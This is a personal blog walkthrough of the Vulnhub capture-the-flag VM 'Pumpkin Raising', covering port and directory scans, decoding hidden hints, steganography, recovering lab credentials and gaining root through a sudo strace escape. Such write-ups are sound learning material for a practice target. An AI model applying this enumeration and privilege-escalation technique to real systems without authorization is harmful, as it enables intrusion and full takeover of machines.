---
layout: post
title:  "Pumpkin Raising Break In"
excerpt: "My solution to the second vm in the pumpking festival series"
date: 2020-02-14 02:15:20 -0500
---

&nbsp;&nbsp;&nbsp;&nbsp;I've managed to break down the fence into the pumpkin garden, now its time for the `pumpkin raising` vulnhub image.
 There's 4 seeds to find, and a root flag to get.

&nbsp;&nbsp;&nbsp;&nbsp;As always, time for the port scan on the ip:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-27 01:43 CST
Nmap scan report for Pumpkin (192.168.11.118)
Host is up (0.000074s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 1a:de:2a:25:2c:cc:51:4b:7a:a0:e0:73:23:b9:3a:64 (DSA)
|   2048 f4:67:d3:d3:e5:24:c0:fc:c4:60:07:1c:1a:34:e9:54 (RSA)
|   256 10:ce:a1:ee:54:27:03:2d:a0:b1:dc:75:80:f2:db:8b (ECDSA)
|_  256 6c:9d:b1:8d:ab:1f:3a:7c:e9:ad:bd:db:d8:81:d7:87 (ED25519)
80/tcp open  http    Apache httpd
| http-robots.txt: 23 disallowed entries (15 shown)
| /includes/ /scripts/ /js/ /secrets/ /css/ /themes/
| /CHANGELOG.txt /underconstruction.html /info.php /hidden/note.txt
| /INSTALL.mysql.txt /seeds/seed.txt.gpg /js/hidden.js /comment/reply/
|_/filter/tips/
|_http-server-header: Apache
|_http-title: Mission-Pumpkin
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds
```

&nbsp;&nbsp;&nbsp;&nbsp;Looks like on the httpd service there is a website hosted
 And notably `:80` is http traffic so its not secured.
 Also there is a mention to "Jack" from the first step, so I might have to break in to his account later.

![pumpkin raising homepage](/assets/2019-12-30-pumpkin-raising/pumpkin_raising_site.png)

&nbsp;&nbsp;&nbsp;&nbsp;Time to poke around on the site a little bit...
 In the pages source there is a comment thats pretty weird looking that I'll put through the decoder.

```
$ echo 'VGhpcyBpcyBqdXN0IHRvIHJlbWFpbmQgeW91IHRoYXQgaXQncyBMZXZlbCAyIG9mIE1pc3Npb24tUHVtcGtpbiEgOyk=' | base64 --decode

This is just to remaind you that it's Level 2 of Mission-Pumpkin! ;)
```

&nbsp;&nbsp;&nbsp;&nbsp;Well that's not helpful, but there is also a link to `pumpkin.html` in the `h3` tag.

![pumpkin raising homepage](/assets/2019-12-30-pumpkin-raising/pumpkin_html.png)

&nbsp;&nbsp;&nbsp;&nbsp;On that page theres a note about Jack again:
```
Poor Jack, he is unaware that people can secretly spy online conversations
```
&nbsp;&nbsp;&nbsp;&nbsp;So my note about this being over http was a hint that there may be some unencrypted communication somewhere.
 I may have to try finding that later.

&nbsp;&nbsp;&nbsp;&nbsp;Time to check the source for this page.
![/pumpkin.html](/assets/2019-12-30-pumpkin-raising/pumpkin.html2.png)

&nbsp;&nbsp;&nbsp;&nbsp;It looks like theres some base64 again and then something else at the bottom.

```
$ echo 'F5ZWG4TJOB2HGL3TOB4S44DDMFYA====' | base64 --decode

error

# I'll try base 32, it looks shorter anyway

$ echo 'F5ZWG4TJOB2HGL3TOB4S44DDMFYA====' | base32 --decode

/scripts/spy.pcap
```

&nbsp;&nbsp;&nbsp;&nbsp;There's that unencrypted communication I was looking for; time to download that packet capture and look at it in wireshark.

![pcap](/assets/2019-12-30-pumpkin-raising/pcap.png)

&nbsp;&nbsp;&nbsp;&nbsp;Theres some juicy goss in that pcap.
 *Notably the seed id is 50609*.

&nbsp;&nbsp;&nbsp;&nbsp;1 down, 3 to go.

&nbsp;&nbsp;&nbsp;&nbsp;Now that thats all done I'll move on to `dirb`.

```
$ dirb http://192.168.1.238:80/ common.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun Dec 29 23:18:16 2019
URL_BASE: http://192.168.1.238:80/
WORDLIST_FILES: wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.1.238:80/ ----
==> DIRECTORY: http://192.168.1.238:80/css/
==> DIRECTORY: http://192.168.1.238:80/hidden/
==> DIRECTORY: http://192.168.1.238:80/images/
+ http://192.168.1.238:80/index.html (CODE:200|SIZE:2526)
+ http://192.168.1.238:80/robots.txt (CODE:200|SIZE:1217)
==> DIRECTORY: http://192.168.1.238:80/scripts/
+ http://192.168.1.238:80/server-status (CODE:403|SIZE:215)

---- Entering directory: http://192.168.1.238:80/css/ ----

---- Entering directory: http://192.168.1.238:80/hidden/ ----

---- Entering directory: http://192.168.1.238:80/images/ ----
+ http://192.168.1.238:80/images/favicon.ico (CODE:200|SIZE:1406)

---- Entering directory: http://192.168.1.238:80/scripts/ ----

-----------------
END_TIME: Sun Dec 29 23:18:19 2019
DOWNLOADED: 23060 - FOUND: 4
```

&nbsp;&nbsp;&nbsp;&nbsp;I tried to get into the hidden directory, but thats forbidden.
 My nmap scan from earlier said there is some stuff under the tcp server though, so looking at those the most interesting one is `/hidden/note.txt`.

In `/hidden/note.txt` there's likely username/pw combos:
```
Robert : C@43r0VqG2=
Mark : Qn@F5zMg4T
goblin : 79675-06172-65206-17765
```

Hmm, those look liek creds, but they dont seem to work to log in to anything... I'll hold on to those for later.

&nbsp;&nbsp;&nbsp;&nbsp;For now I'll jump back the comments `pumpkin.html` from earlier
 And there is a bunch of integers. maybe it's text encoded has hex or something.
```
 % echo "59 61 79 21 20 41 70 70 72 65 63 69 61 74 65 20 79 6f 75 72 20 70 61 74 69 65 6e 63 65 20 3a 29 0a 41 6c 6c 20 74 68 69 6e 67 73 20 61 72 65 20 64 69 66 66 69 63 75 6c 74 20 62 65 66 6f 72 65 20 74 68 65 79 20 62 65 63 6f 6d 65 20 65 61 73 79 2e 0a 41 63 6f 72 6e 20 50 75 6d 70 6b 69 6e 20 53 65 65 64 73 20 49 44 3a 20 39 36 34 35 34 0a 0a 44 6f 2c 20 72 65 6d 65 6d 62 65 72 20 74 6f 20 69 6e 66 6f 72 6d 20 4a 61 63 6b 20 74 6f 20 70 6c 61 6e 74 20 61 6c 6c 20 34 20 73 65 65 64 73 20 69 6e 20 74 68 65 20 73 61 6d 65 20 6f 72 64 65 72 2e" | xxd -r -p

Yay! Appreciate your patience :)
All things are difficult before they become easy.
Acorn Pumpkin Seeds ID: 96454

Do, remember to inform Jack to plant all 4 seeds in the same order.%
```
&nbsp;&nbsp;&nbsp;&nbsp;Cool tip you dont need a fucking tool suite to decode.
 Most of those tools are on the command line already.
 But now  I have 2 seeds!

&nbsp;&nbsp;&nbsp;&nbsp;Next I'll try to look at another link; let's try `underconstruction.html`.
![underconstruction.html](/assets/2019-12-30-pumpkin-raising/underconstruction.png)

&nbsp;&nbsp;&nbsp;&nbsp;This `h4` tag is weird `jackolantern dot GraphicsInterchangeFormat is under images`, thats not actually the name of the file in the page either, so that file has got to be useful.
 It's an image so there might be a file embedded in it, I'll have to check the size.
 Time to use stegosuite.
```
% wget http://192.168.1.238/images/jackolantern.gif
% stegosuite
passphrase: (its probably one of the passwords i got in note.txt earlier)
```
![/pumpkin_embded](/assets/2019-12-30-pumpkin-raising/pumpkin_stego.png)

&nbsp;&nbsp;&nbsp;&nbsp;The embedded file has a seed in it!
 3 seeds. One left.

```
cat decorative.txt

Fantastic!!! looking forward for your presence in pumpkin party.
Lil' Pump-Ke-Mon Pumpkin seeds ID : 86568
```

&nbsp;&nbsp;&nbsp;&nbsp;One last seed to go.

```
wget http://192.168.1.238/seeds/seed.txt.gpg
```

&nbsp;&nbsp;&nbsp;&nbsp;None of those passwords seem to work.
 But that string on the bottom of the home page works

```
 ❯ gpg -d seed.txt.gpg
 <use SEEDWATERSUNLIGHT as password>
gpg: AES256 encrypted data
gpg: encrypted with 1 passphrase

                               _
                              /\              )\
                _           __)_)__        .'`--`'.
                )\_      .-'._'-'_.'-.    /  ^  ^  \
             .'`---`'. .'.' /o\'/o\ '.'.  \ \/\/\/ /...-_..
            /  <> <>  \ : ._:  0  :_. : \  '------'       _J_..-_
            |    A    |:   \\/\_/\//   : |     _/)_    .'`---`'.    ..-_
'...    ..  \  <\_/>  / :  :\/\_/\/:  : /   .'`----`'./.'0\ 0\  \
           _?_._`"`_.'`'-:__:__:__:__:-'   /.'<\   /> \:   o    |..-_
        .'`---`'.``  _/(              /\   |:,___A___,|' V===V  /
       /.'a . a  \.'`---`'.        __(_(__ \' \_____/ /'._____.'
       |:  ___   /.'/\ /\  \    .-'._'-'_.'-:.______.' _?_            ..-.
..-    \'  \_/   |:   ^    |  .'.' (o\'/o) '.'.     .'`"""`'.-...-_
        '._____.'\' 'vvv'  / / :_/_:  A  :_\_: \   /   ^.^   \
                  '.__.__.' | :   \'=...='/   : |  \  `===`  /
         --                  \ :  :'.___.':  : /    `-------`
                    -.        '-:__:__:__:__:-'..
.._,'...-.._,'...-.._,'...-.._,'...-.._,'...-.._,'...-.._,'...-.._,'...-
-.-- .. .--. .--. . . -.-.--
                                -.-- --- ..-
    .- .-. .
                        --- -.
                                                               - .... .
       .-. .. --. .... -
                     .--. .- - .... .-.-.- .-.-.- .-.-.-
                            -... .. --. -- .- -..- .--. ..- -- .--. -.- .. -.
... . . -.. ...
                 .. -.. ---...
                                    -.... ----. ..... ----- --...
```
&nbsp;&nbsp;&nbsp;&nbsp;But that below all the pumpkins is actually just a bunch of dots and dashes, so morse code
CyberChef decrypts that (thanks https://www.hackingarticles.in/pumpkinraising-vulnhub-walkthrough/)

```
 T  T     I   E OF U   M N  YIPPEE! YOU ARE ON THE RIGHT PATH... BIGMAXPUMPKIN SEEDS ID: 69507
```
&nbsp;&nbsp;&nbsp;&nbsp;That was one was kinda convoluted to find, but thats all the seeds.

```
Seed IDS:
69507
50609
96454
86568
```

&nbsp;&nbsp;&nbsp;&nbsp;Time to get into the box.
The Jack login is a combination of the seed ids `69507506099645486568` .


```
❯ ssh jack@192.168.1.238
jack@192.168.1.238's password:
------------------------------------------------------------------------------
                          Welcome to Mission-Pumpkin
      All remote connections to this machine are monitored and recorded
------------------------------------------------------------------------------
Last login: Sat Feb 15 09:15:30 2020 from blade
jack@Pumpkin:~$ sudo -l
Matching Defaults entries for jack on Pumpkin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jack may run the following commands on Pumpkin:
    (ALL) NOPASSWD: /usr/bin/strace
jack@Pumpkin:~$ sudo strace -o /dev/null /bin/bash
root@Pumpkin:~# cat flag.txt
cat: flag.txt: No such file or directory
root@Pumpkin:~# cd /home/
root@Pumpkin:/home# ls
jack
root@Pumpkin:/home# cd jack/
root@Pumpkin:~# ls
root@Pumpkin:~# cd /root
root@Pumpkin:/root# ls
flag.txt
root@Pumpkin:/root# cat flag.txt
Congratulation!
Jack will take care of planting your seeds.
Hope to see you at Pumpkin Festival
```

&nbsp;&nbsp;&nbsp;&nbsp;Thats all the seeds and the flag, I guess I'm done.

## Conclusions:
&nbsp;&nbsp;&nbsp;&nbsp;This ctf was way trickier than the first one in the series, and admittedly I cheated a fair bit off of [Raj Chandel's writeup](https://www.hackingarticles.in/pumpkinraising-vulnhub-walkthrough/), but it taught me a bunch of tools and potential places things can be.
 Well, on to round 3.
